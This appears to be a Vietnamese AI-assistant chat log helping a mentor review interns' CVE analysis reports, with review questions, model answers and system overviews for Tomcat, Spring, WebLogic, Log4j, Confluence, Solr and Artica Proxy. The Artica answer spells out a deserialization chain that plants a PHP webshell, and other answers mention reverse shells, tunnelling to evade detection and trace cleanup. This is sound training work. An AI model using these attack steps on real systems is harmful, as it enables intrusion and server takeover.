> **Đáp án:** `unserialize()` trong PHP khôi phục một object từ chuỗi serialized. Khi unserialize, PHP: (1) Tạo object với class tương ứng, (2) Gán giá trị cho tất cả properties (kể cả private/protected — attacker kiểm soát hoàn toàn), (3) Khi object bị hủy (script kết thúc hoặc unset), PHP tự động gọi magic method `__destruct()`. Lỗi ở đây: input `$_GET['build-js']` do user kiểm soát hoàn toàn → attacker craft serialized object của class `Net_DNS2_Cache_File` → set `$cache_file` = đường dẫn webshell, `$cache_data` = PHP code → khi `__destruct()` chạy → ghi file PHP độc hại lên server → truy cập webshell → RCE. `base64_decode` không phải cơ chế bảo mật, chỉ là encoding → attacker chỉ cần base64_encode payload.

**Q2: "Giải thích chi tiết gadget chain: từ `unserialize()` → `Net_DNS2_Cache_File.__destruct()` → RCE. Mỗi property được set giá trị gì?"**

> **Đáp án:** Gadget chain: (1) Attacker craft serialized object `Net_DNS2_Cache_File` với: `$cache_file = "/usr/share/artica-postfix/wizard/shell.php"` (đường dẫn ghi webshell), `$cache_data = ["<?php system($_GET['cmd']); ?>"]` (nội dung PHP webshell), `$cache_serializer` = null (để resize() trả data trực tiếp). (2) Gửi qua URL: `wiz.wizard.progress.php?build-js=<base64_of_serialized_payload>`. (3) PHP unserialize → tạo Net_DNS2_Cache_File object. (4) Script kết thúc → `__destruct()` tự động gọi → `fopen($this->cache_file, 'a+')` mở file để ghi → `fwrite($fp, $data)` ghi PHP code. (5) Attacker truy cập `https://target/wizard/shell.php?cmd=whoami` → RCE với quyền www-data.

**Q3: "Tại sao thư mục `/wizard/` vẫn truy cập được sau khi cài đặt? Đây là lỗi thiết kế phổ biến nào?"**

> **Đáp án:** Đây là lỗi **"Leftover Debug/Install Interface"** — một pattern phổ biến trong web security. Wizard/installer cần chạy không cần auth (vì chưa có user nào). Sau khi cài đặt, lẽ ra phải: (1) Xóa thư mục wizard, hoặc (2) Thêm check `if (setup_completed) { die("Setup already done"); }`, hoặc (3) Web server deny access `/wizard/` trong nginx/apache config. Artica không làm cả 3 → bất kỳ ai biết đường dẫn đều truy cập được. Tương tự: WordPress có `/wp-admin/install.php` (nhưng WP check `is_blog_installed()`), Joomla xóa thư mục installation sau setup. OWASP gọi đây là **"Security Misconfiguration"** (A05:2021).

**Q4: "Magic method `__destruct()` trong PHP là gì? Ngoài `__destruct`, còn magic method nào bị lạm dụng trong PHP deserialization?"**

> **Đáp án:** `__destruct()` được PHP gọi tự động khi object bị hủy (script end, unset, garbage collection). Các magic method khác bị lạm dụng: (1) `__wakeup()` — gọi ngay sau unserialize(), có thể trigger hành vi nguy hiểm, (2) `__toString()` — gọi khi object bị convert sang string (VD: trong echo, concatenation), (3) `__call()` — gọi khi method không tồn tại được invoke, (4) `__get()/__set()` — gọi khi access property không tồn tại. Trong PHP deserialization, attacker xây dựng "POP chain" (Property-Oriented Programming): chain nhiều class qua các magic method để đạt được primitive mong muốn (file write, code execution, SQL injection).

**Q5: "Autoload mechanism (`spl_autoload_register`) có vai trò gì trong exploit này? Nếu không có autoload, exploit có thành công không?"**

> **Đáp án:** `spl_autoload_register('Net_DNS2::autoload')` đăng ký hàm tự động load class. Khi PHP gặp `unserialize()` chứa object của class `Net_DNS2_Cache_File`, nó cần load class definition. Nếu class chưa được include, PHP gọi registered autoloader → `Net_DNS2::autoload('Net_DNS2_Cache_File')` → `include str_replace('_', '/', $name) . '.php'` → load file `Net/DNS2/Cache/File.php`. **Nếu không có autoload**: PHP sẽ báo lỗi "Class 'Net_DNS2_Cache_File' not found" → unserialize thất bại → exploit không thành công. Autoload là điều kiện cần vì file `wiz.wizard.progress.php` không trực tiếp include thư viện Net_DNS2. Tuy nhiên, file DNS2.inc (chứa autoloader) phải được include ở đâu đó trong execution path — trong trường hợp này, nó được include qua class.wizard.inc hoặc framework chung của Artica.

**Q6: "Báo cáo của em mới chỉ có phần phân tích lý thuyết. Em đã thực sự khai thác được lỗ hổng chưa? Nếu rồi, mô tả lại các bước. Nếu chưa, em gặp khó khăn gì?"**

> **Đáp án mong đợi:** Đây là câu hỏi mở để đánh giá trung thực. Nếu em đã khai thác: phải mô tả được (1) Cài Artica Proxy 4.50 trên VM, (2) Craft payload serialized bằng PHP script, (3) Base64 encode, (4) Gửi qua URL parameter build-js, (5) Webshell được ghi, (6) Truy cập webshell → RCE. Nếu chưa: cần xác định khó khăn cụ thể — cài Artica phức tạp? Không biết craft payload? Để gợi ý hướng giải quyết cho tuần sau.

---

## BẢNG TỔNG HỢP 7 BÁO CÁO — XẾP HẠNG CUỐI CÙNG

| Hạng | Thực tập sinh | CVE | Điểm | Lab | Kiến trúc | Khai thác | PoC | Root Cause | Patch |
|---|---|---|---|---|---|---|---|---|---|
| 1 | **Nguyễn Bá Hải Long** | CVE-2022-22965 | **9.5/10** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 2 | **Lê Đức Hoàng** | CVE-2020-1938 | **9/10** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| 2 | **Đàm Phương Linh** | CVE-2023-22515 | **9/10** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 4 | **Nguyễn Hữu Dũng** | CVE-2020-14882 | **8.5/10** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 5 | **Trần Việt Bách** | CVE-2021-44228 | **7/10** | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ |
| 6 | **Phạm Lê Nam** | CVE-2019-17558 | **6.5/10** | ⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐ |
| 7 | **Lê Văn Quân** | CVE-2024-2054 | **3.5/10** | — | — | — | — | ⭐⭐⭐⭐ | — |

---

## CHI TIẾT TỪ BÁO CÁO 1–6 (tóm tắt từ phân tích trước)

### 1. LÊ ĐỨC HOÀNG (9/10) — CVE-2020-1938 Ghostcat

**Điểm mạnh:** Phân tích exploit code Python chi tiết (AjpForwardRequest, AjpResponse, Tomcat class), root cause 4 file Java (AbstractAjpProcessor, DefaultServlet, JspServlet, server.xml), chuỗi LFI→RCE hoàn chỉnh, lab có sơ đồ IP rõ.

**Câu hỏi + đáp án:**

**Q1: "AJP khác HTTP thế nào? Tại sao cần cổng 8009?"**
> AJP là binary protocol cho giao tiếp nội bộ web server → Tomcat. Khác HTTP (text-based), AJP gói tin nhỏ gọn, giảm overhead. Cổng 8009 phục vụ reverse proxy pattern. Vấn đề: AJP thiết kế cho trusted network, không có auth.

**Q2: "3 thuộc tính `javax.servlet.include.*` — thiếu 1 thì sao?"**
> `request_uri` xác định context, `servlet_path` chỉ Servlet xử lý, `path_info` chứa file path. Thiếu `path_info` → không có target file. Thiếu `servlet_path` → DefaultServlet không kích hoạt. Cả 3 cần đồng bộ.

**Q3: "Firewall chặn 8009 mở 8080 — khai thác được không?"**
> Không. Ghostcat chỉ qua AJP port 8009. HTTP 8080 không chấp nhận AJP packets. Nhưng nếu có foothold nội bộ, vẫn có thể.

**Q4: "`request.setAttribute(n,v)` không lọc vi phạm nguyên tắc nào?"**
> Vi phạm "Never Trust User Input" và Least Privilege. AJP nhận attribute từ packet rồi gán thẳng vào Request object. Thuộc tính `javax.servlet.include.*` vốn chỉ dành internal dispatch nhưng attacker tiêm từ ngoài.

**Q5: "Điều kiện leo thang LFI→RCE?"**
> Cần: (1) Upload function trên ứng dụng, (2) File upload nằm trong Tomcat document root, (3) File chứa JSP code hợp lệ. Không có upload → chỉ LFI.

**Q6: "Bản vá regex whitelist — bypass được không?"**
> Khó vì check chuẩn (null default → 403, regex match). Tuy nhiên: nếu regex quá lỏng, Unicode normalization hoặc encoding tricks có thể bypass. Cách an toàn nhất: chặn/restrict cổng 8009.

---

### 2. NGUYỄN BÁ HẢI LONG (9.5/10) — CVE-2022-22965 Spring4Shell

**Điểm mạnh:** Lab 3 lớp WAN/DMZ/LAN phức tạp nhất, full kill chain (CVE→tunnel→credential theft→UDF→privesc→cleanup), sơ đồ attack flow 8 bước, patch toàn diện 5 biện pháp.

**Q1: "`class.module.classLoader` bypass CVE-2010-1622 thế nào?"**
> CVE-2010-1622 blacklist `classLoader` và `protectionDomain`. Java 9 thêm `getModule()` → chuỗi `class.module.classLoader` đi vòng qua Module, không bị blacklist.

**Q2: "Tại sao chọn AccessLogValve?"**
> AccessLogValve có setter public cho directory/prefix/suffix/pattern → kiểm soát nơi ghi file + nội dung. Pattern `%{header}i` chèn JSP code vào header → log ra .jsp file.

**Q3: "`secure_file_priv` không rỗng → bypass UDF?"**
> Nếu trỏ `/tmp`, không ghi được vào plugin_dir → UDF thất bại. Workaround: symlink, LOAD DATA LOCAL, hoặc crontab reverse shell trong `/tmp`.

**Q4: "DPI phát hiện Chisel — phương án thay thế?"**
> SSH tunnel, DNS tunneling (dnscat2), Chisel qua HTTPS, HTTP tunnel (Neo-reGeorg webshell), domain fronting.

**Q5: "Xóa dấu vết — còn artifact nào?"**
> Network logs pfSense, Tomcat access.log, MySQL general log, filesystem timestamps, process accounting, network captures, /proc/*/fd.

**Q6: "Tại sao WAR vulnerable mà embedded JAR không?"**
> WAR deploy trên Tomcat → ClassLoader hierarchy gồm ParallelWebappClassLoader → attacker traverse đến Tomcat internal (AccessLogValve). Embedded JAR dùng LaunchedURLClassLoader của Spring Boot → không expose Tomcat pipeline components.

---

### 3. NGUYỄN HỮU DŨNG (8.5/10) — CVE-2020-14882 WebLogic

**Điểm mạnh:** Tự code Lab NodeJS mô phỏng WebLogic, dùng Burp Suite chuyên nghiệp, patch code before/after rõ ràng 3 file.

**Q1: "Lab NodeJS vs WebLogic thật — khác biệt?"**
> Giống: filter bypass mechanism, double decoding. Khác: Java Servlet Filter vs NodeJS middleware, ShellSession class vs exec(), WebLogic SecurityManager vs không.

**Q2: "Chi tiết double encoding?"**
> `%252e%252e%252f` → HTTP decode 1 → `%2e%2e%2f` → middleware thấy OK → router decode 2 → `../`. Vấn đề: 2 component decode số lần khác nhau.

**Q3: "Class nào khác trên WebLogic bị lạm dụng RCE?"**
> FileSystemXmlApplicationContext (remote XML), ShellSession (MVEL), UnitOfWorkChangeSet (deserialization). Oracle patch bằng blacklist → researcher tìm class mới liên tục.

**Q4: "Bypass blacklist `..`?"**
> Triple encoding bị chặn (đã double decode). Unicode fullwidth `.` hoặc backslash `..\\` trên Windows có thể bypass. Cải thiện: dùng `path.normalize()` + canonicalization.

**Q5: "So sánh bản vá NodeJS vs Oracle chính thức?"**
> Oracle dùng whitelist class (an toàn hơn), em dùng blacklist behavior. Oracle patch cả 2 CVE cùng lúc trong CPU Oct 2020.

---

### 4. TRẦN VIỆT BÁCH (7/10) — CVE-2021-44228 Log4Shell

**Điểm mạnh:** Debug breakpoint 10+ class trong Log4j source code (Login→XmlConfiguration→StrSubstitutor→resolveVariable→Interpolator→JndiLookup→InitialContext.lookup), sơ đồ lab 4 thành phần.

**Cần cải thiện:** Text giải thích quá ít (dựa hầu hết vào screenshot), patch analysis chỉ show version number không giải thích.

**Q1: "Payload `${jndi:ldap://...}` — thay rmi/dns?"**
> `rmi://` → RCE nhưng Java 8u121+ block. `dns://` → chỉ DNS lookup, không RCE, dùng cho detection. `ldaps://` → LDAP qua TLS.

**Q2: "Exploit.java implements ObjectFactory — static block vai trò gì?"**
> Static block chạy ngay khi class loaded vào JVM (trước constructor). ObjectFactory cần cho JNDI spec — LDAP server trả javaCodeBase + javaFactory → client download + load → static block execute → reverse shell.

**Q3: "`StrSubstitutor.substitute()` — tại sao recursive?"**
> Quét `${...}`, nếu `substitutionInVariablesEnabled=true` → resolve nested `${}` trước (VD: `${${lower:j}ndi:...}`). Recursive nguy hiểm → bypass bản vá 2.15.0 (CVE-2021-45046).

**Q4: "2.15.0 chưa đủ, phải 2.17.0 — tại sao?"**
> 2.15.0: disable JNDI default + allowlist → bypass qua non-default config. 2.16.0: disable message lookups → DoS via infinite recursion. 2.17.0: fix recursion + restrict JNDI to java: protocol only. 2.17.1: fix JDBC Appender RCE.

**Q5: "Air-gapped system — Log4Shell khai thác được?"**
> RCE khó (cần outbound LDAP). Nhưng info leak qua `${env:SECRET}` + error messages vẫn có. Nếu attacker có foothold nội bộ → setup LDAP server local → RCE.

**Q6: "Tại sao thư viện logging cần JNDI?"**
> Mục đích ban đầu: lấy config từ LDAP directory, log tên app từ JNDI context. Vấn đề: Log4j xử lý `${}` trong MỌI log message kể cả user input → vi phạm data/code separation.

---

### 5. ĐÀM PHƯƠNG LINH (9/10) — CVE-2023-22515 Confluence

**Điểm mạnh:** Debug Struts2 interceptors sâu nhất, root cause 3 lớp (Broken Access Control + Unsafe Data Binding + Mutable State), attack flow diagram chuyên nghiệp, patch so sánh code 8.5.1 vs 8.5.2.

**Q1: "SafeParametersInterceptor vs ParametersInterceptor?"**
> Safe chặn ASTEval (arbitrary expression) nhưng cho ASTChain (a.b.c) → vẫn traverse object graph → reach setupComplete setter.

**Q2: "ASTEval vs ASTChain trong OGNL?"**
> ASTEval: evaluate expression → RCE trực tiếp. ASTChain: navigate via dot notation → gọi getter/setter. CVE-22515 chỉ cần setter → ASTChain đủ.

**Q3: "Xóa `/server-info.action` — tìm attack surface mới?"**
> Scan toàn bộ JAR → tìm action extends ConfluenceActionSupport + @PublicAccess + defaultStack interceptor → trace object graph đến critical state.

**Q4: "ReadOnlyApplicationConfig + reflection bypass?"**
> Cần deserialization chain → reflection → bypass ReadOnly. Bản vá có 3 lớp (xóa endpoint + ReadOnly + không expose object) → defense in depth.

**Q5: "CVSS 10.0 — so sánh Log4Shell vs CVE-22515?"**
> Log4Shell nguy hiểm hơn thực tế: triệu ứng dụng bị ảnh hưởng, transitive dependency ẩn, trigger dễ (bất kỳ input nào). CVE-22515 ưu điểm: không cần victim outbound connection.

---

### 6. PHẠM LÊ NAM (6.5/10) — CVE-2019-17558 Apache Solr

**Điểm mạnh:** Quy trình khai thác đúng (Nmap→version check→Config API→SSTI→reverse shell), payload screenshot chi tiết, root cause code VelocityResponseWriter.

**Cần cải thiện:** Thiếu chiều sâu giải thích, patch analysis chỉ liệt kê biện pháp mà không so sánh code.

**Q1: "Config API request body — tại sao Solr không auth?"**
> POST `/solr/demo/config` update VelocityResponseWriter. Solr <= 8.1 không có auth built-in, mặc định TẮT. Thiết kế cho nội bộ, không tính Internet exposure.

**Q2: "`params.resource.loader.enabled=true` nguy hiểm?"**
> Cho phép Velocity nhận template từ URL query parameter → SSTI: attacker viết template chứa Java Reflection → Runtime.exec() → RCE.

**Q3: "Phân tích payload Velocity?"**
> `#set($x="")` → String object. `$x.class.forName("java.lang.Runtime")` → Reflection load Runtime. `.getRuntime().exec("...")` → execute OS command. Base64 encode để tránh special chars.

**Q4: "SSTI Velocity vs Jinja2 vs FreeMarker?"**
> Nguyên lý chung: template engine nhận user input làm code. Velocity: Reflection chain. Jinja2: MRO chain `__class__.__mro__`. FreeMarker: `?new()` utility execute.

**Q5: "Bản vá Solr 8.4.0 thay đổi gì?"**
> `params.resource.loader.enabled` default = false, không thể change qua Config API (hardcoded). VelocityResponseWriter deprecated từ 8.6, removed từ 9.0.

**Q6: "solrconfig.xml `${velocity.params.resource.loader.enabled}` — resolve từ đâu?"**
> JVM system property, solr.xml, solrcore.properties, environment variable. Config API cho phép override runtime → attacker POST thay đổi. Bản vá: Config API không được override.

---

## NHẬN XÉT TỔNG QUAN

### Nhóm xuất sắc (8.5+):
- **Nguyễn Bá Hải Long** (9.5): Lab phức tạp nhất, tư duy pentester thực tế nhất
- **Lê Đức Hoàng** (9): Phân tích code exploit sâu nhất
- **Đàm Phương Linh** (9): Debug framework sâu nhất, root cause analysis rõ nhất
- **Nguyễn Hữu Dũng** (8.5): Sáng tạo nhất (tự code lab), Burp Suite pro

### Nhóm trung bình (6-7):
- **Trần Việt Bách** (7): Debug code tốt nhưng thiếu text, patch yếu
- **Phạm Lê Nam** (6.5): Đúng quy trình nhưng thiếu chiều sâu

### Nhóm cần bổ sung gấp:
- **Lê Văn Quân** (3.5): **Báo cáo chưa hoàn thành** — cần bổ sung 5/6 yêu cầu: lab setup, sơ đồ kiến trúc, khai thác thực tế, PoC, và phân tích bản vá. Phần root cause analysis tốt nhưng chỉ chiếm ~15% yêu cầu.

---

**User**

Thêm cho tôi câu hỏi để giới thiệu cái hệ thống này là gì và để làm gì chứ, kiểu dựng hệ thống thì phải biết hệ thống mục đích là để làm gì đúng không

---

**Cursor**

Đúng rồi — trước khi khai thác, phải hiểu hệ thống đó là gì, ai dùng, dùng để làm gì. Dưới đây là bộ câu hỏi giới thiệu hệ thống cho cả 7 báo cáo, kèm đáp án.

---

# CÂU HỎI GIỚI THIỆU HỆ THỐNG — 7 BÁO CÁO

---

## 1. LÊ ĐỨC HOÀNG — Apache Tomcat + Giao thức AJP

**Q: "Apache Tomcat là gì? Trong thực tế, tổ chức nào thường dùng Tomcat và để làm gì? Tại sao lại cần cả port 8080 lẫn port 8009 cùng lúc?"**

> **Đáp án:** Apache Tomcat là một **Java Servlet Container** (hay Application Server) — phần mềm thực thi các ứng dụng web viết bằng Java (Servlet, JSP). Tomcat không phải web server đầy đủ như Apache HTTPD hay Nginx mà chuyên xử lý logic phía backend Java.
>
> **Ai dùng:** Rất phổ biến trong doanh nghiệp — ngân hàng, chính phủ, hệ thống nội bộ công ty. Các framework như Spring MVC, Struts2 đều có thể deploy lên Tomcat. Jenkins CI/CD cũng chạy trên Tomcat.
>
> **Kiến trúc 2 port:**
> - **Port 8080 (HTTP Connector):** Phục vụ request trực tiếp từ người dùng hoặc load balancer.
> - **Port 8009 (AJP Connector):** Dùng cho mô hình **reverse proxy** — Apache HTTPD hoặc Nginx đứng trước nhận traffic từ Internet, rồi chuyển tiếp request sang Tomcat qua giao thức AJP (binary, nhanh hơn HTTP). Apache xử lý static files, SSL; Tomcat xử lý Java logic. Giao tiếp nội bộ này không cần auth vì giả định là trusted network — đây chính là nguyên nhân Ghostcat nguy hiểm.

---

## 2. NGUYỄN BÁ HẢI LONG — Spring Framework + Spring MVC

**Q: "Spring Framework là gì? Tại sao Spring được dùng rộng rãi trong doanh nghiệp? Sự khác biệt giữa deploy WAR trên Tomcat và chạy Spring Boot embedded JAR là gì?"**

> **Đáp án:** Spring Framework là **Java application framework** phổ biến nhất thế giới — cung cấp dependency injection, AOP, transaction management. Spring MVC là module xử lý HTTP request/response theo pattern Model-View-Controller.
>
> **Tại sao phổ biến:** Giảm boilerplate code Java, hỗ trợ tích hợp với database, message queue, security (Spring Security), cloud. Hầu hết backend Java enterprise ở Việt Nam (ngân hàng, fintech, thương mại điện tử) dùng Spring.
>
> **WAR trên Tomcat vs embedded JAR:**
> - **WAR (Web Archive):** Đóng gói ứng dụng, deploy lên Tomcat server riêng biệt. Tomcat quản lý lifecycle, nhiều app có thể share 1 Tomcat instance. ClassLoader hierarchy: Bootstrap → System → Common → **WebApp** → trong đó WebApp ClassLoader có thể traverse lên Tomcat internals (AccessLogValve) — đây là điều kiện Spring4Shell cần.
> - **Embedded JAR (Spring Boot default):** Tomcat được nhúng trong JAR, chạy như process độc lập. ClassLoader của Spring Boot (`LaunchedURLClassLoader`) không expose Tomcat pipeline ra ngoài → Spring4Shell **không khai thác được**.

---

## 3. NGUYỄN HỮU DŨNG — Oracle WebLogic Server

**Q: "Oracle WebLogic Server là gì? WebLogic khác Tomcat thế nào? Tại sao doanh nghiệp lớn chọn WebLogic thay vì Tomcat? Admin Console ở port 7001 dùng để làm gì?"**

> **Đáp án:** Oracle WebLogic Server là **Java EE Application Server** thương mại, đầy đủ tính năng hơn Tomcat nhiều. WebLogic hỗ trợ toàn bộ Java EE spec: EJB, JMS (messaging), JTA (distributed transaction), JNDI, Clustering, HA (High Availability).
>
> **WebLogic vs Tomcat:**
> | | Tomcat | WebLogic |
> |---|---|---|
> | Loại | Servlet Container | Full Java EE Server |
> | Chi phí | Free (Apache) | Trả phí (Oracle) |
> | EJB | Không | Có |
> | Clustering | Hạn chế | Đầy đủ |
> | Dùng bởi | SME, startup | Bank, telco, enterprise lớn |
>
> **Ai dùng WebLogic:** Ngân hàng lớn (Oracle Fusion Middleware cho core banking), Telco, chính phủ, Oracle E-Business Suite, Siebel CRM. Chi phí license cao nhưng hỗ trợ enterprise 24/7.
>
> **Admin Console port 7001:** Giao diện web quản trị toàn bộ WebLogic domain — deploy/undeploy application, configure datasource, monitor performance, manage cluster nodes, set security policies. Đây là "trái tim" của WebLogic infrastructure → chiếm được Admin Console = chiếm toàn bộ hệ thống. CVE-2020-14882 bypass authentication của chính console này.

---

## 4. TRẦN VIỆT BÁCH — Apache Log4j

**Q: "Apache Log4j là gì? Tại sao một thư viện logging lại có mặt ở khắp nơi đến mức Log4Shell ảnh hưởng hàng triệu hệ thống? Logging trong ứng dụng Java dùng để làm gì?"**

> **Đáp án:** Apache Log4j là **Java logging library** — thư viện ghi log cho ứng dụng Java. Log4j 2 là phiên bản hiện đại, hỗ trợ async logging, nhiều output (console, file, database, syslog), cấu hình linh hoạt qua XML/JSON.
>
> **Tại sao có mặt khắp nơi:**
> - Java không có built-in logging tốt (java.util.logging nghèo nàn)
> - Log4j là dependency **bắc cầu** — rất nhiều framework lớn (Elasticsearch, Kafka, Redis client, Spring) dùng Log4j2 → ứng dụng dùng framework đó tự động có Log4j dù developer không biết
> - Khi Log4Shell công bố, các công ty không biết mình có Log4j hay không vì nó nằm sâu trong dependency tree
>
> **Logging dùng để làm gì:**
> - Ghi lại hoạt động hệ thống để debug khi có lỗi
> - Audit trail — ai đăng nhập, làm gì, lúc mấy giờ
> - Security monitoring — phát hiện attack attempts
> - Business analytics — user hành vi, lỗi thanh toán
>
> **Điều nguy hiểm:** Developers thường log **tất cả** user input (`logger.info("Login attempt: " + username)`) mà không ngờ rằng Log4j sẽ **evaluate** chuỗi đó như code. Đây là vi phạm nguyên tắc data/code separation cơ bản nhất.

---

## 5. ĐÀM PHƯƠNG LINH — Atlassian Confluence

**Q: "Atlassian Confluence là gì? Confluence dùng để làm gì trong một tổ chức? Tại sao Confluence là mục tiêu tấn công hấp dẫn? Confluence Data Center khác gì Confluence Cloud?"**

> **Đáp án:** Atlassian Confluence là **enterprise wiki và knowledge management platform** — nơi các tổ chức lưu trữ, chia sẻ tài liệu nội bộ: tài liệu kỹ thuật, quy trình nghiệp vụ, meeting notes, project documentation.
>
> **Dùng để làm gì:**
> - Kỹ thuật: lưu architecture docs, API specs, runbooks, post-mortem reports
> - HR: onboarding guides, company policies, org chart
> - Product: roadmap, user stories, sprint planning
> - Tích hợp với Jira (issue tracking), Bitbucket (code), Slack
>
> **Tại sao là target hấp dẫn:**
> - Chứa **tài liệu nhạy cảm nhất** của tổ chức: credentials (database passwords lưu trong docs), network diagrams, business logic, trade secrets
> - Thường accessible từ Internet (remote work)
> - Database credentials, API keys, infrastructure docs thường được paste vào Confluence
> - Chiếm được Confluence = có access toàn bộ knowledge base của công ty
>
> **Data Center vs Cloud:**
> - **Data Center/Server:** Self-hosted, công ty tự quản lý server → CVE-2023-22515 ảnh hưởng loại này
> - **Confluence Cloud:** Atlassian host, không bị CVE này (Atlassian vá ở infrastructure level)

---

## 6. PHẠM LÊ NAM — Apache Solr

**Q: "Apache Solr là gì? Solr dùng để làm gì trong một ứng dụng? Tại sao Solr thường được expose ra mạng? VelocityResponseWriter sinh ra để làm gì?"**

> **Đáp án:** Apache Solr là **enterprise search platform** mã nguồn mở, xây dựng trên Apache Lucene. Solr index và tìm kiếm văn bản với hiệu năng cao, hỗ trợ faceted search, full-text search, geo search, spell checking.
>
> **Dùng ở đâu:**
> - E-commerce: tìm kiếm sản phẩm (Shopify, Best Buy từng dùng)
> - News site: tìm kiếm bài viết
> - Enterprise: tìm kiếm tài liệu nội bộ
> - Log analytics (cạnh tranh với Elasticsearch)
> - Nhiều CMS như Drupal, Magento tích hợp Solr
>
> **Tại sao thường exposed:**
> - Port 8983 mặc định không có auth
> - Admin/DevOps expose để debug hoặc nhầm lẫn firewall rule
> - Shodan index hàng chục nghìn Solr instances mở công khai
>
> **VelocityResponseWriter:**
> Apache Velocity là **Java template engine** — render HTML từ template + data. VelocityResponseWriter cho phép dev viết template để format kết quả search thành HTML tùy chỉnh thay vì JSON mặc định. Mục đích tốt: tùy biến UI hiển thị kết quả. Nhưng khi `params.resource.loader.enabled=true` → template nhận từ URL → user kiểm soát template = kiểm soát code thực thi → SSTI.

---

## 7. LÊ VĂN QUÂN — Artica Proxy

**Q: "Artica Proxy là gì? Proxy server dùng để làm gì trong mạng doanh nghiệp? Tại sao một proxy server lại cần có Installation Wizard? CVE-2024-2054 nguy hiểm như thế nào với tổ chức dùng Artica?"**

> **Đáp án:** Artica Proxy là **network proxy và security gateway** — thiết bị/phần mềm đứng giữa mạng nội bộ và Internet, kiểm soát toàn bộ traffic web của tổ chức.
>
> **Proxy dùng để làm gì:**
> - **Web filtering:** Chặn mạng xã hội, pornography, malware sites theo policy công ty
> - **Authentication:** Nhân viên muốn ra Internet phải qua proxy xác thực bằng LDAP/AD
> - **Monitoring/Logging:** Ghi nhận ai truy cập site nào, lúc mấy giờ, bao nhiêu bandwidth
> - **SSL Inspection (MITM):** Decrypt HTTPS traffic để scan malware (controversial)
> - **Caching:** Cache nội dung web phổ biến → tiết kiệm bandwidth
>
> **Tại sao có Installation Wizard:**
> Artica là phần mềm phức tạp, cần cấu hình ban đầu: chọn mode (proxy, DNS firewall, reverse-proxy, gateway...), timezone, admin password, network settings. Wizard là giao diện thân thiện hướng dẫn từng bước, hoạt động **trước khi** admin account được tạo → phải không cần auth.
>
> **Mức độ nguy hiểm:**
> Proxy server là **điểm kiểm soát toàn bộ traffic mạng** → chiếm được Artica Proxy = có thể:
> - Đọc toàn bộ log web của nhân viên
> - Sửa đổi web filtering rules (mở sites độc hại)
> - SSL inspection keys → decrypt HTTPS của toàn tổ chức
> - Pivot vào mạng nội bộ từ vị trí DMZ
> - Tắt proxy → toàn bộ nhân viên mất Internet
> - CVSS 9.8 vì: unauthenticated + RCE + từ xa.

---

## GỢI Ý CÁCH HỎI

Anh có thể mở đầu buổi review bằng câu hỏi hệ thống **trước** khi đi vào technical details — kiểu như:

> *"Trước khi nói về lỗ hổng, em giải thích cho anh nghe [tên hệ thống] là gì, ai dùng, và tại sao tổ chức cần nó. Nếu em là attacker, tại sao em sẽ nhắm vào hệ thống này?"*

Câu hỏi này giúp đánh giá ngay từ đầu xem thực tập sinh có **context awareness** hay chỉ làm theo tutorial mà không hiểu mục tiêu thực sự. Người hiểu hệ thống mới biết tại sao lỗ hổng đó **nguy hiểm** và **đáng giá** để khai thác.

